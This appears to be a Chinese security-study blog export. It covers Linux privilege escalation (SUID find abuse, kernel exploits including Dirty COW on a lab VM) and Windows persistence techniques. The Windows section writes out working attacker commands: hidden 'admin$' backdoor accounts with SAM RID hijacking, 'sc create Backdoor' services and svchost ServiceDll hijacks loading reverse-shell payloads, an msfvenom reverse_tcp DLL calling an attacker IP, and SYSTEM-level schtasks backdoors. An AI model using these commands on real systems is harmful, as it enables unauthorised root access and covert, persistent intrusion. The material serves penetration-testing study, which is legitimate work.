<p>利用工具的信息收集，得到的信息来判断是否具有提权的可能性</p>
<p>步骤：下载好LinEnum.sh并通过webshell上传到靶机中（一般上传到&#x2F;tmp文件夹中，具有打开的权限）</p>
<p>然后对该文件赋予权限chmod -x</p>
<p>之后运行该文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022191955669.png"
                      alt="image-20221022191955669"
                ></p>
<p>得到该系统的各项参数，以便进行后续的提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022192137982.png"
                      alt="image-20221022192137982"
                ></p>
<p>SUID里面看是不是有下面图片那些元素，有就可以利用SUID提权</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022195904933.png"
                      alt="image-20221022195904933" style="zoom:150%;" 
                >

<p>其他的工具也是一样的方法</p>
<h4 id="Linux提权SUID配合脚本提权"><a href="#Linux提权SUID配合脚本提权" class="headerlink" title="Linux提权SUID配合脚本提权"></a>Linux提权SUID配合脚本提权</h4><p>漏洞成因：chmod u+s给予了suid      u-s删除了suid</p>
<p>使程序在运行中受到suid root权限的执行过程导致，就是上面那些执行的时候是调用root权限执行，所以可以利用这一特性来实施提权</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022194323506.png"
                      alt="image-20221022194323506" style="zoom:150%;" 
                >

<p>提权过程：探针是否有SUID可以用上图的手工命令，也可以中自动脚本</p>
<p>步骤：</p>
<p>利用msf进行反弹连接，连接三步骤</p>
<p>然后利用upload命令将信息收集工具上传到靶机目录（一般是&#x2F;tmp目录）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022200754775.png"
                      alt="image-20221022200754775"
                ></p>
<p>然后输入shell进行工具的定位及使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022200638234.png"
                      alt="image-20221022200638234"
                ></p>
<p>发现SUID FILE具有find字样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201035132.png"
                      alt="image-20221022201035132"
                ></p>
<p>说明可以利用SUID提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201212416.png"
                      alt="image-20221022201212416"
                ></p>
<p>利用上面的指令，先touch +名字  然后find 名字  -exec whoami  ; 即可发现是root权限</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201254320.png"
                      alt="image-20221022201254320" style="zoom:150%;" 
                >

<p>然后利用<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201600033.png"
                      alt="image-20221022201600033"
                >命令即可反弹一个具有root权限的shell</p>
<p>这时候指令前面就可以省略 find  +名字</p>
<h4 id="Linux提权本地配合内核漏洞提权"><a href="#Linux提权本地配合内核漏洞提权" class="headerlink" title="Linux提权本地配合内核漏洞提权"></a>Linux提权本地配合内核漏洞提权</h4><p>提权过程：连接—获取可利用漏洞—下载或者上传exp—编译exp—给权限执行—提权成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022202857938.png"
                      alt="image-20221022202857938"
                ></p>
<p>利用刚才上面所讲的工具利用的方法运行漏洞探针工具</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022203820926.png"
                      alt="image-20221022203820926" style="zoom:150%;" 
                >

<p>找到需要的漏洞，就是最后一个，打开附带的连接将exploits改为download即可下载漏洞，或者直接网上下载文件45010.c文件</p>
<p>将下载好的文件上传上去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204141443.png"
                      alt="image-20221022204141443"
                ></p>
<p>然后执行.&#x2F;45010，即可获得root权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204216654.png"
                      alt="image-20221022204216654"
                ></p>
<h4 id="Linux提权脏牛内核漏洞"><a href="#Linux提权脏牛内核漏洞" class="headerlink" title="Linux提权脏牛内核漏洞"></a>Linux提权脏牛内核漏洞</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204555115.png"
                      alt="image-20221022204555115"
                ></p>
<p>步骤：vulnhub靶机—探针目标—CMS漏洞利用—脚本探针提权漏洞—利用内核提权</p>
<h5 id="脏牛提权靶机演示"><a href="#脏牛提权靶机演示" class="headerlink" title="脏牛提权靶机演示"></a>脏牛提权靶机演示</h5><p>准备工作：先将靶机下载好安装在vm虚拟机上，开启靶机以及一台kali攻击机</p>
<p>利用kali的ifconfig命令查看自己的IP地址以获取靶机的IP网段</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205245255.png"
                      alt="image-20221022205245255"
                ></p>
<p>可知靶机的IP地址处于192.168.76.0&#x2F;24网段，利用nmap扫描网段内的活跃主机，获取IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205448204.png"
                      alt="image-20221022205448204"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205536430.png"
                      alt="image-20221022205536430"
                ></p>
<p>得到IP地址192.168.76.141，继续对该IP进行端口扫描，发现1898端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205702744.png"
                      alt="image-20221022205702744"
                ></p>
<p>打开192.168.76.141:1898网站发现该网站是基于drupal开发的，下一步便可以网上搜索该框架的漏洞</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210118051.png"
                      alt="image-20221022210118051"  
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210143398.png"
                      alt="image-20221022210143398" style="zoom:200%;" 
                >

<p>或者也可以利用msf的search功能进行漏洞查找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210236441.png"
                      alt="image-20221022210236441"
                ></p>
<p>利用这个漏洞，就是第四个</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210355497.png"
                      alt="image-20221022210355497"
                ></p>
<p>设置靶机主机及端口获得反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210501903.png"
                      alt="image-20221022210501903"
                ></p>
<p>接下来就是要开始提权了</p>
<p>上传漏洞探针工具到靶机，并且验证是否上传成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210837819.png"
                      alt="image-20221022210837819" style="zoom:150%;" 
                >

<p>然后利用shell模块执行上传的工具</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210959042.png"
                      alt="image-20221022210959042" style="zoom:150%;" 
                >	 	 	 		

<p>发现这一个漏洞，俗称脏牛漏洞</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211113039.png"
                      alt="image-20221022211113039" style="zoom:150%;" 
                >

<p>访问给出的连接，下载漏洞<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211342944.png"
                      alt="image-20221022211342944"
                ></p>
<p>下载后上传<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211520869.png"
                      alt="image-20221022211520869"
                >上传到对方目录文件重命名为40847.cpp</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211842805.png"
                      alt="image-20221022211842805" style="zoom:150%;" 
                >

<p>因为是.cpp文件所以需要进行编译，第一行为编译命令，就会生成一个dcow文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212012161.png"
                      alt="image-20221022212012161" style="zoom:150%;" 
                >

<p>由于该漏洞利用具有交互式，得确保交互式才能正常回显，所以需要第二行的命令来开启交互式<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212514715.png"
                      alt="image-20221022212514715"
                ></p>
<p>然后运行.&#x2F;dcow即可得到一个root账户的密码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212609301.png"
                      alt="image-20221022212609301" style="zoom:150%;" 
                >

<p>然后切换root账户进行登入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212727952.png"
                      alt="image-20221022212727952"
                ></p>
<p>获得root权限<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212746567.png"
                      alt="image-20221022212746567"
                ></p>
<p>然后就可以访问&#x2F;root目录下的文件发现有一个flag.txt文件，访问flag.txt就可以得到flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212927461.png"
                      alt="image-20221022212927461" style="zoom:150%;" 
                >

<p>完成！！！</p>
<h3 id="Linux环境变量-amp-定时任务-amp-数据库"><a href="#Linux环境变量-amp-定时任务-amp-数据库" class="headerlink" title="Linux环境变量&amp;定时任务&amp;数据库"></a>Linux环境变量&amp;定时任务&amp;数据库</h3><h4 id="Linux提权本地环境变量安全"><a href="#Linux提权本地环境变量安全" class="headerlink" title="Linux提权本地环境变量安全"></a>Linux提权本地环境变量安全</h4><p>配合SUID进行环境变量提权-本地用户环境下</p>
<p>过程：手写调用文件—编译—复制文件—增加环境变量—执行触发</p>
<p>步骤：</p>
<p>通过命令<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162713543.png"
                      alt="image-20221024162713543"
                ></p>
<p>将demo.c文件编译成shell文件</p>
<p>demo.c源代码<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162933036.png"
                      alt="image-20221024162933036"
                ></p>
<p>就是执行ps文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162333961.png"
                      alt="image-20221024162333961" style="zoom:200%;" 
                >



<p>加个.&#x2F;ps就是执行sh了</p>
<p>在变量PATH&#x3D;&#x2F;tmp中添加&#x2F;tmp变量，执行的是ps（当时实际上执行的是sh）</p>
<p>执行shell文件实际上就是demo.c文件，源代码是运行ps但是实际上是运行了sh，造成root权限</p>
<p>那为什么是运行sh呢？ 前面说过正常输入ps其实就是运行ps，只有.&#x2F;ps才能调用sh运行，但是因为前面设置了环境变量&#x2F;tmp所以默认是调用tmp里面的ps，也就是运行sh</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024163227059.png"
                      alt="image-20221024163227059" style="zoom:150%;" 
                >







<h4 id="Linux定时任务安全–本地"><a href="#Linux定时任务安全–本地" class="headerlink" title="Linux定时任务安全–本地"></a>Linux定时任务安全–本地</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024165155471.png"
                      alt="image-20221024165155471"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024210529479.png"
                      alt="image-20221024210529479" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027213507541.png"
                      alt="image-20221027213507541"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027221254785.png"
                      alt="image-20221027221254785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027221305324.png"
                      alt="image-20221027221305324"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027222303044.png"
                      alt="image-20221027222303044"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027223034688.png"
                      alt="image-20221027223034688" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027223233692.png"
                      alt="image-20221027223233692" style="zoom:150%;" 
                >
]]></content>
  </entry>
  <entry>
    <title>权限维持---Windows</title>
    <url>/2024/02/29/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-Windows/</url>
    <content><![CDATA[<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h3 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h3><p>利用文件隐藏可做到一定程度的权限维持，一般用于隐藏木马文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib +a +h +r +s xxx.exe</span><br><span class="line"># R只读文件属性</span><br><span class="line"># A存档文件属性</span><br><span class="line"># S系统文件属性</span><br><span class="line"># H隐藏文件属性</span><br></pre></td></tr></table></figure></div>

<h6 id="改变系统文件夹图标"><a href="#改变系统文件夹图标" class="headerlink" title="改变系统文件夹图标"></a>改变系统文件夹图标</h6><p>可以通过更改图标的形式进行隐藏</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样就可以个改变文件夹图标，就可以降低被发现的概率，增加在系统停留的时间</p>
<h6 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md test....\</span><br><span class="line">rd /s /q test....\</span><br></pre></td></tr></table></figure></div>



<h3 id="后门用户（影子账户）"><a href="#后门用户（影子账户）" class="headerlink" title="后门用户（影子账户）"></a>后门用户（影子账户）</h3><p>查看当前所有系统用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818172636015.png"
                      alt="image-20230818172636015"
                ></p>
<p>添加用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user admin$ Abcd123456 /add</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818172737349.png"
                      alt="image-20230818172737349"
                ></p>
<p>可以发现“$”符号表示隐藏用户的意思，利用命令行无法查看，但是在“控制面板”“计算机管理”等仍然能看到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818172903202.png"
                      alt="image-20230818172903202"
                ></p>
<p>然后将这个用户添加到管理员组中，这样就具有管理员权限了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818172947107.png"
                      alt="image-20230818172947107"
                ></p>
<p>也可以手动修改注册表来实现继承管理员的权限</p>
<p>1.在注册表编辑器中定位到HKEY_LOCAL_MACHINE\SAM\SAM\右键单击，选择‘权限’命令，将Administrator用户的权限设置为完全控制</p>
<p>这是由于注册表项的内容在标准用户和管理员用户下都是不可见的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818173117542.png"
                      alt="image-20230818173117542"
                ></p>
<p>2.在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Accout\Users\Names，处选择Administrator用户在左侧找到与右边显示的键值的类型“0x1f4”相同的目录名，即000001F4，复制000001F4中F文件的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818173329503.png"
                      alt="image-20230818173329503"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818173312878.png"
                      alt="image-20230818173312878"
                ></p>
<p>3.同理，找到隐藏账户的admin$相应的目录000003EA ，将他复制的000001F4中的F的值粘贴到他的F中，确认</p>
<p>原理是：隐藏用户劫持了管理员账户的的RID，从而使Hacker$具有管理员权限</p>
<p>5.分别选中admin$和00003EA并导出，然后运行<code>net user admin$ /del</code> 删除</p>
<p>之后再用的话将导出的注册表导入回去即可</p>
<p>通过修改注册表来进一步隐藏用户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/v1ncilazy/BypassAddUser</span><br></pre></td></tr></table></figure></div>



<h3 id="系统服务后门"><a href="#系统服务后门" class="headerlink" title="系统服务后门"></a>系统服务后门</h3><p>主要原理就是测试人员将对于“自动”的系统服务，测试人员可以将这种服务的启动二进制文件路径改为攻击荷载或者后门程序，当系统和服务重启的时候就可以重新启动，但是得需要管理员权限</p>
<p>系统服务会自启，所以将路径攻击载荷的路径，服务启动时就会启动攻击载荷</p>
<h6 id="1-创建系统服务"><a href="#1-创建系统服务" class="headerlink" title="1.创建系统服务"></a>1.创建系统服务</h6><p>执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc create Backdoor binpath= &quot;cmd.exe /K C:\Windows\System32\reverse_tcp.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;</span><br><span class="line"></span><br><span class="line">binpath后面必须有空格</span><br><span class="line">obj指定运行权限</span><br><span class="line">start指定启动类型</span><br></pre></td></tr></table></figure></div>

<p>reverse_tcp.exe这个利用msf生成并通过shell后门上传，一旦系统服务启动就会连带启动木马后门，实现权限维持</p>
<h6 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h6><p>这边使用txt文档演示</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818174422797.png"
                      alt="image-20230818174422797"
                ></p>
<p>然后重启系统，就可以自动运行所指定的txt文档，将文档换成后门文件同理</p>
<h6 id="2-利用现有服务"><a href="#2-利用现有服务" class="headerlink" title="2.利用现有服务"></a>2.利用现有服务</h6><p>利用现有服务路径修改即可，将路径映射至木马文件路径就可以实现木马持续被启动，达到权限维持的目的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用sc config修改binpath二进制选项</span><br><span class="line">也可以修改注册表ImagePath键</span><br></pre></td></tr></table></figure></div>

<h6 id="3-利用svchost-exe启动服务"><a href="#3-利用svchost-exe启动服务" class="headerlink" title="3.利用svchost.exe启动服务"></a>3.利用svchost.exe启动服务</h6><p>简要来说就是Windows中有些进程的启动得依托它才行</p>
<p>以DLL形式实现，所以可以将可执行文件路径指向svchost.exe，由它调用DLL文件，具体哪个就得是这个服务在注册表的信息决定的了</p>
<p>举个栗子</p>
<p>以wuauserv服务为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093442598.png"
                      alt="image-20230322093442598"
                ></p>
<p>这个服务的启动路径是由svchost.exe加载DLL实现的</p>
<p>这之中还有个parameters子项ServiceDLL是表明由哪个DLL文件负责的，就是说这个服务运行时会加载wuaueng.dll文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322093846338.png"
                      alt="image-20230322093846338"
                ></p>
<p>注意每个svchost.exe负责一组进程的运行</p>
<p>svchost.exe的所有服务分组于注册表的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103733030.png"
                      alt="image-20230322103733030"
                ></p>
<p>中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322103923408.png"
                      alt="image-20230322103923408"
                ></p>
<p>攻击的原理就是加载恶意服务到svchost.exe中建立持久化后门，又不是单独运行的，所以隐蔽性特别高</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击步骤</span><br><span class="line">1制作一个后门dll文件</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.81.135 lport=6000 -f dll -o gongji.dll   </span><br><span class="line"></span><br><span class="line">2.上传至目标主机System32目录执行以下命令</span><br><span class="line"></span><br><span class="line">先创建一个名为backdoor的服务，然后以svchost加载方式启动，服务分组为netsvc</span><br><span class="line">sc create backdoor binPath= &quot;C:\Windows\Ststem32\svchost.exe -k netsvc&quot; start= auto obj= LocalSystem</span><br><span class="line">然后再将这个服务启动时的加载路径设为后门木马的路径</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor\Parameters /v ServiceDll /t REG_EXPAND_SZ /d &quot;C:\Windows\System32\reverse_tcp.dll&quot;</span><br><span class="line">配置服务描述</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v Destription /t REG_sz /d &quot;Windows xxx Service&quot;</span><br><span class="line">配置服务显示名称</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\backdoor /v DisplayName /t REG_sz /d &quot;Backdoor&quot;</span><br><span class="line">创建服务新分组netsvc，并将backdoor服务添加进去</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrrntVersion\Svchost&quot; /v netsvc /t REG_MULTI_SZ /d backdoor</span><br></pre></td></tr></table></figure></div>

<p>然后只要系统重启就可以导致木马被重新启动</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>就是让目标主机再指定的周期内自动重复的运行事先准备好的后门</p>
<p>使用schtasks命令来实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /Create /TN Backdoor /SC daily /ST 08:00 /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</span><br><span class="line">表示在主机上创建一个名为Backdoor的任务，并在每天的8点以SYSTEM权限运行</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322170426739.png"
                      alt="image-20230322170426739"
                ></p>
<p>以下命令是创建一个名为Backdoor的计划任务，每60秒运行一次</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /Create /TN  Backdoor /SC minute /MO 1 /TR C:\Windows\System\reverse_tcp.exe /RU System /F</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818174736798.png"
                      alt="image-20230818174736798"
                ></p>
<p>然后等待一分钟，123.txt就会被调用运行</p>
<p>有一点要说明计划任务是在计划任务库中的类似文件目录的形式存储，所有的计划任务都在最内层，为了增加隐蔽性，所以要遵守规范</p>
<p>执行以下命令，表示在路径下创建一个AppRun的后门</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230322172521990.png"
                      alt="image-20230322172521990"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013112041958.png"
                      alt="image-20231013112041958"  
                >



<h3 id="BOF技术"><a href="#BOF技术" class="headerlink" title="BOF技术"></a>BOF技术</h3><p>BOF是一个通用目标文件格式（COFF）可执行问价，具有在beacon.h中定义的标准函数的API</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/trustedsec/CS-Remote-OPs-BOF</span><br></pre></td></tr></table></figure></div>

<p>但是CS木马需要先做免杀</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtaskscreate &quot;\\MicrosoftI\\Windows\\Customer Experience</span><br><span class="line">Improvement Program\\Server\\ServerRoleCollector-RunDaily&quot; XML CREATE</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="COM组件劫持"><a href="#COM组件劫持" class="headerlink" title="COM组件劫持"></a>COM组件劫持</h3><p>COM对象吧面向对象语言中的对象封装起来，并提供一致接口，使得可以被各种语言收使用（跨编程语言接口）</p>
<p>区分COM 组件的唯一标识为Guid，分别为针对接口的IID与针对类的CLSID</p>
<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>可以在HKCU:\Software\Classes\CLSID中添加键值“劫持”HKCR:\CLSID中的键值。用户的COM对象也将从HKCR:\CLSID加载，因此我们可以直接修改HKCU:\Software\Classes\CLSID，进而有效地劫持HKCR:\CLSID中的键值</p>
<h3 id="启动项-x2F-注册表键后门"><a href="#启动项-x2F-注册表键后门" class="headerlink" title="启动项&#x2F;注册表键后门"></a>启动项&#x2F;注册表键后门</h3><h6 id="1-系统启动文件夹"><a href="#1-系统启动文件夹" class="headerlink" title="1.系统启动文件夹"></a>1.系统启动文件夹</h6><p>将程序放在启动文件夹中会导致该程序在用户登入时启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定用户登入时启动</span><br><span class="line">C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start</span><br><span class="line">C:\C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">所有用户登入时启动</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></div>

<p>木马放进去就行</p>
<p>实操</p>
<p>在文件夹中放入一个文本文档</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818175207005.png"
                      alt="image-20230818175207005"
                ></p>
<p>重新登陆之后就会被调用启动</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230818175146482.png"
                      alt="image-20230818175146482"
                ></p>
<h6 id="2-运行键（Run-Key）"><a href="#2-运行键（Run-Key）" class="headerlink" title="2.运行键（Run Key）"></a>2.运行键（Run Key）</h6><p>windows中有许多注册表项可以用来设置在系统启动或者用户登陆时运行指定的程序或加载指定DLL文件</p>
<p>当登陆时，系统就会依次运行位于注册表运行键中的程序</p>
<p>默认创建以下运行键，如果要修改HKEY_LOCAL_MACHINE下的运行键，需要拥有管理员级别的权限</p>
